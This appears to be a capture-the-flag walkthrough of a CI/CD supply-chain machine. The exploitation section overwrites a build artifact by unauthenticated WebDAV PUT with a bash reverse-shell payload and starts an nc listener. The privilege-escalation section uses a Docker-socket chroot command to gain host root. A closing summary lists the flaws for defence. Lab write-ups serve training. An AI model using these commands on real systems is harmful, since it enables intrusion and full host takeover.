# Walkthrough: CI/CD Supply Chain Attack (HTB Medium)

## Challenge Overview
This challenge simulates a modern CI/CD environment where a build pipeline fetches artifacts from an internal store. The goal is to identify a misconfiguration in the artifact storage, exploit it to gain initial access, and then escalate privileges using the Docker socket.

---

## 1. Enumeration

### Initial Discovery
Upon visiting the main web page, we see a "NexusDev CI/CD" dashboard. The dashboard shows several active pipelines and mentions that artifacts are fetched from `/artifacts/latest.sh`.

There is also a link to a repository at `/repo/`.

### Directory Listing
Exploring `/repo/` reveals several files:
- `.github/workflows/build.yml`
- `build.sh`

Reading `build.sh`:
```bash
ARTIFACT_URL="http://127.0.0.1/artifacts/latest.sh"
...
curl -fsSL "$ARTIFACT_URL" -o ./build-artifact.sh
chmod +x ./build-artifact.sh
./build-artifact.sh
```
The script downloads and executes a script from `/artifacts/latest.sh`.

### Identifying the Misconfiguration
Check the headers or attempt to interact with `/artifacts/`.
The dashboard also mentions:
> "Internal artifact store is accessible via **WebDAV** for convenience during the migration phase. Authentication is currently disabled for local network nodes."

Let's test if we can upload files using WebDAV.

---

## 2. Exploitation: Initial Access

### Testing WebDAV PUT
We can try to overwrite `/artifacts/latest.sh` using the `PUT` method.

```bash
curl -X PUT http://<TARGET_IP>/artifacts/latest.sh --data-binary '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'
```

If the `PUT` request succeeds (HTTP 201 or 204), our malicious script is now the "latest artifact".

### Gaining a Reverse Shell
The `build.sh` script runs as a cron job every 5 minutes (as seen in the `Dockerfile` or implied by the "Live Monitoring" on the dashboard).

1. Start a listener on your machine: `nc -lvnp <YOUR_PORT>`
2. Wait for the cron job to run.

Once the cron job executes, we get a shell as the `devops` user.

### User Flag
The user flag is located in `/home/devops/user.txt`.

---

## 3. Privilege Escalation

### Enumerating `devops` User
Checking groups:
```bash
id
# uid=1000(devops) gid=1000(devops) groups=1000(devops),999(docker)
```
The `devops` user is in the `docker` group. This is a classic privilege escalation path.

### Exploiting Docker Socket
Since we have access to the Docker socket (either via the `docker` group or directly if `/var/run/docker.sock` is writable), we can run a container and mount the host's root filesystem.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Once inside, we are effectively root on the host system.

### Root Flag
The root flag is located in `/root/root.txt`.

---

## Summary of Vulnerabilities
1. **Misconfigured WebDAV**: Allows unauthorized `PUT` requests to an artifact store.
2. **Insecure CI/CD Pipeline**: Downloads and executes scripts from a remote source without integrity verification (no hash or signature check).
3. **Over-privileged User**: The `devops` user is in the `docker` group, allowing trivial privilege escalation to root.
